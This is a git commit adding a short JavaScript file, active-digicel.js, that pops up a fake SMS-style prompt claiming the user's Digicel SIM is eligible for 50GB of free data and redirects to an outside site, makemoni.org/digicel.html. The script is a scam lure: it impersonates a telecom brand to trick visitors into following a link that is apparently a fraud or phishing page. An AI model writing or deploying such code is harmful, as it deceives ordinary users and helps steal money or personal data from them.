12441cedd9818ab45e56056efaa1d64b4f800618
bestplugg <nsiukpe247@gmail.com>
2025-07-29 00:04:08 +0100

    Create active-digicel.js

---
+++ active-digicel.js
@@ -0,0 +1,5 @@
+var password = 'Activate 50GB'
+password=prompt('SMS: Congratulations, your Digicel SIM card is eligible to receive free data old sim card reward, click OK to activate now','Activate 50GB');
+if (password != 'Activate 50GB') {
+location.href='https://makemoni.org/digicel.html';
+}
